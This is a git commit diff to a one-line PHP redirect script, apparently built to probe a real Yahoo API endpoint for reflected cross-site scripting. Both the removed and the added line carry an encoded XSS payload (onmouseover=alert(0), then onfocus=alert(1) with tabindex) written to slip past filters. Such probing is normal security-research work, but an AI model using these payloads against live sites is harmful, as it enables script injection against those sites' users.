e18985dfd1cbff3c87c706a60fd0dedf53de6c5a
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-21 22:48:40 +0100

    Update redir1.php

--- redir1.php
+++ redir1.php
@@ -1,1 +1,1 @@
-<?php header('location: http://api.view.yahoo.com/api/series/xxxxxa%3Cx~%250aonmouseover=alert(0)%3Eqqqq') ?> 
+<?php header('location: http://api.view.yahoo.com/api/series/xxxxx<x~%26%23x25%3b0A%20onfocus=alert(1)%20id=a%20tabindex=0>qqqq') ?> 
